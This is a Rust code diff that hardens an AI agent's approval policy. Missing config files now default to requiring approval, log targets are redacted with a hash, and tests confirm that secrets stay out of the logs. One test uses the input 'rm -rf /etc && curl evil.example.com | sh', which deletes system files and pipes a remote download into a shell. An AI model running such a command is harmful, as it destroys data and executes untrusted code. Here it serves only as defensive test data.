@@ -231,10 +231,10 @@ impl ConfigApprovalPolicy {
             },
             Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                 debug!(
-                    "Approval policy file not found at {}. Using permissive defaults.",
+                    "Approval policy file not found at {}. Using safe defaults (all actions require approval).",
                     path.display()
                 );
-                Self::permissive_default()
+                Self::safe_default()
             }
             Err(e) => {
                 error!(
@@ -280,12 +280,9 @@ impl ConfigApprovalPolicy {
     ///
     /// Every action type defaults to [`ApprovalDecision::Allow`].
     ///
-    /// This is the production no-config default: the tools that hold an
-    /// `ApprovalPolicy` (`DesktopTool`, `PimTool`, `AutomationTool`) emit
-    /// `Desktop*`/`PimWrite` action types, so an all-`Allow` desktop default
-    /// keeps autonomous desktop/PIM/automation behavior unchanged from when no
-    /// policy was wired at all. Dropping a `~/.aleph/approval-policy.json` is
-    /// the explicit opt-in to tighten this (e.g. `desktop_automation: ask`).
+    /// No longer reachable from `load_from` (missing files now use
+    /// `safe_default`), but retained for explicit opt-in and tests.
+    #[allow(dead_code)]
     fn permissive_default() -> Self {
         let mut defaults = HashMap::new();
         defaults.insert(ActionType::BrowserNavigate, DefaultDecision::Allow);
@@ -344,6 +341,11 @@ impl ApprovalPolicy for ConfigApprovalPolicy {
     async fn check(&self, request: &ActionRequest) -> ApprovalDecision {
         let action = &request.action_type;
         let target = &request.target;
+        let prompt_target: &str = if request.display_target.is_empty() {
+            target.as_str()
+        } else {
+            request.display_target.as_str()
+        };
 
         // 1. Blocklist takes priority (pre-compiled regexes, grouped by ActionType)
         if let Some(rules) = self.blocklist_by_type.get(action) {
@@ -351,7 +353,7 @@ impl ApprovalPolicy for ConfigApprovalPolicy {
                 if rule.regex.is_match(target) {
                     debug!(
                         action = ?action,
-                        target = %target,
+                        target = %redact_target(target),
                         pattern = %rule.pattern,
                         "Blocked by blocklist rule"
                     );
@@ -368,7 +370,7 @@ impl ApprovalPolicy for ConfigApprovalPolicy {
                 if rule.regex.is_match(target) {
                     debug!(
                         action = ?action,
-                        target = %target,
+                        target = %redact_target(target),
                         pattern = %rule.pattern,
                         "Allowed by allowlist rule"
                     );
@@ -385,7 +387,7 @@ impl ApprovalPolicy for ConfigApprovalPolicy {
                     reason: format!("Denied by default policy for {action}"),
                 },
                 DefaultDecision::Ask => ApprovalDecision::Ask {
-                    prompt: format!("Action {action} on target '{target}' requires approval"),
+                    prompt: format!("Action {action} on target '{prompt_target}' requires approval"),
                 },
             };
         }
@@ -393,7 +395,7 @@ impl ApprovalPolicy for ConfigApprovalPolicy {
         // 4. No default → Ask
         ApprovalDecision::Ask {
             prompt: format!(
-                "No policy configured for {action} on '{target}'. Please approve or deny."
+                "No policy configured for {action} on '{prompt_target}'. Please approve or deny."
             ),
         }
     }
@@ -401,12 +403,20 @@ impl ApprovalPolicy for ConfigApprovalPolicy {
     async fn record(&self, request: &ActionRequest, decision: &ApprovalDecision) {
         info!(
             action = ?request.action_type,
-            target = %request.target,
+            target = %redact_target(&request.target),
             agent = %request.agent_id,
             decision = ?decision,
             "Approval decision recorded"
         );
     }
+}
+
+fn redact_target(target: &str) -> String {
+    use std::collections::hash_map::DefaultHasher;
+    use std::hash::{Hash, Hasher};
+    let mut h = DefaultHasher::new();
+    target.hash(&mut h);
+    format!("<redacted len={} sha={:016x}>", target.len(), h.finish())
 }
 
 // ---------------------------------------------------------------------------
@@ -416,6 +426,16 @@ impl ApprovalPolicy for ConfigApprovalPolicy {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::approval::types::ActionRequest;
+    use chrono::Utc;
+    use std::sync::{Arc, Mutex};
+    use tracing::field::Visit;
+    use tracing::{Event, Subscriber};
+    use tracing_subscriber::layer::{Context, Layer};
+    use tracing_subscriber::registry::LookupSpan;
+    use tracing_subscriber::util::SubscriberInitExt;
+    use tracing_subscriber::prelude::__tracing_subscriber_SubscriberExt;
+    use tracing_subscriber::EnvFilter;
 
     #[test]
     fn test_glob_single_star() {
@@ -479,5 +499,188 @@ mod tests {
         // Dots and parens are escaped properly
         assert!(matches_glob("a.b.c", "a.b.c"));
         assert!(!matches_glob("axbxc", "a.b.c"));
+    }
+
+    #[test]
+    fn redact_target_never_returns_raw_content() {
+        let secret = "rm -rf /etc && curl evil.example.com | sh";
+        let r = redact_target(secret);
+        assert!(!r.contains("rm -rf"));
+        assert!(!r.contains("evil.example.com"));
+        assert!(r.contains(&secret.len().to_string()));
+    }
+
+    #[test]
+    fn redact_target_is_stable_across_calls() {
+        let s = "stable-content-123";
+        assert_eq!(redact_target(s), redact_target(s));
+    }
+
+    #[derive(Default)]
+    struct CapturedFields {
+        pairs: Vec<(String, String)>,
+    }
+
+    impl Visit for CapturedFields {
+        fn record_debug(&mut self, field: &tracing::field::Field, value: &dyn std::fmt::Debug) {
+            self.pairs
+                .push((field.name().to_string(), format!("{value:?}")));
+        }
+        fn record_str(&mut self, field: &tracing::field::Field, value: &str) {
+            self.pairs.push((field.name().to_string(), value.to_string()));
+        }
+        fn record_i64(&mut self, field: &tracing::field::Field, value: i64) {
+            self.pairs
+                .push((field.name().to_string(), value.to_string()));
+        }
+        fn record_u64(&mut self, field: &tracing::field::Field, value: u64) {
+            self.pairs
+                .push((field.name().to_string(), value.to_string()));
+        }
+        fn record_bool(&mut self, field: &tracing::field::Field, value: bool) {
+            self.pairs
+                .push((field.name().to_string(), value.to_string()));
+        }
+    }
+
+    struct CaptureLayer {
+        events: Arc<Mutex<Vec<Vec<(String, String)>>>>,
+    }
+
+    impl<S> Layer<S> for CaptureLayer
+    where
+        S: Subscriber + for<'a> LookupSpan<'a>,
+    {
+        fn on_event(&self, event: &Event<'_>, _ctx: Context<'_, S>) {
+            let mut v = CapturedFields::default();
+            event.record(&mut v);
+            self.events.lock().unwrap().push(v.pairs);
+        }
+    }
+
+    fn captured_runs() -> Arc<Mutex<Vec<Vec<(String, String)>>>> {
+        Arc::new(Mutex::new(Vec::new()))
+    }
+
+    fn make_request_with_target(action_type: ActionType, target: &str) -> ActionRequest {
+        ActionRequest {
+            action_type,
+            target: target.to_string(),
+            display_target: String::new(),
+            agent_id: "audit-test".to_string(),
+            context: "audit-test".to_string(),
+            timestamp: Utc::now(),
+        }
+    }
+
+    fn policy_blocking_secret(action: ActionType, secret: &str) -> ConfigApprovalPolicy {
+        use std::collections::HashMap;
+        let pattern = format!("*{secret}*");
+        ConfigApprovalPolicy::new(PolicyConfig {
+            version: 1,
+            defaults: HashMap::new(),
+            allowlist: vec![],
+            blocklist: vec![PolicyRule {
+                action_type: action,
+                pattern,
+            }],
+        })
+    }
+
+    fn target_field(fields: &[(String, String)]) -> Option<&str> {
+        for (k, v) in fields {
+            if k == "target" {
+                return Some(v.as_str());
+            }
+        }
+        None
+    }
+
+    #[tokio::test]
+    async fn check_log_redacts_clipboard_text() {
+        let secret_clipboard = "TOP_SECRET_TOKEN_ABCDEF-12345";
+        let req = make_request_with_target(ActionType::DesktopType, secret_clipboard);
+        let policy = policy_blocking_secret(ActionType::DesktopType, secret_clipboard);
+
+        let sink = captured_runs();
+        let layer = CaptureLayer {
+            events: Arc::clone(&sink),
+        };
+        let _guard = tracing_subscriber::registry()
+            .with(EnvFilter::new("debug"))
+            .with(layer)
+            .set_default();
+
+        let _ = policy.check(&req).await;
+
+        drop(_guard);
+        let captured = sink.lock().unwrap();
+        assert!(!captured.is_empty(), "expected a debug log from check()");
+        for fields in captured.iter() {
+            let target_value = target_field(fields).unwrap_or("");
+            assert!(
+                !target_value.contains(secret_clipboard),
+                "target field must not contain raw clipboard text, got: {target_value}"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn record_log_redacts_pim_body() {
+        let secret_pim_body = "PATIENT_SSN_999-88-7777";
+        let req = make_request_with_target(ActionType::PimWrite, secret_pim_body);
+        let policy = ConfigApprovalPolicy::default();
+
+        let sink = captured_runs();
+        let layer = CaptureLayer {
+            events: Arc::clone(&sink),
+        };
+        let _guard = tracing_subscriber::registry()
+            .with(EnvFilter::new("debug"))
+            .with(layer)
+            .set_default();
+
+        policy
+            .record(&req, &ApprovalDecision::Allow)
+            .await;
+
+        drop(_guard);
+        let captured = sink.lock().unwrap();
+        assert!(!captured.is_empty(), "expected an info log from record()");
+        for fields in captured.iter() {
+            let target_value = target_field(fields).unwrap_or("");
+            assert!(
+                !target_value.contains(secret_pim_body),
+                "target field must not contain raw PIM body, got: {target_value}"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn check_log_redacts_script_body() {
+        let secret_script = "echo LEAK_THIS_TOKEN_NOW";
+        let req = make_request_with_target(ActionType::DesktopAutomation, secret_script);
+        let policy = policy_blocking_secret(ActionType::DesktopAutomation, secret_script);
+
+        let sink = captured_runs();
+        let layer = CaptureLayer {
+            events: Arc::clone(&sink),
+        };
+        let _guard = tracing_subscriber::registry()
+            .with(EnvFilter::new("debug"))
+            .with(layer)
+            .set_default();
+
+        let _ = policy.check(&req).await;
+
+        drop(_guard);
+        let captured = sink.lock().unwrap();
+        for fields in captured.iter() {
+            let target_value = target_field(fields).unwrap_or("");
+            assert!(
+                !target_value.contains(secret_script),
+                "target field must not contain raw script body, got: {target_value}"
+            );
+        }
     }
 }
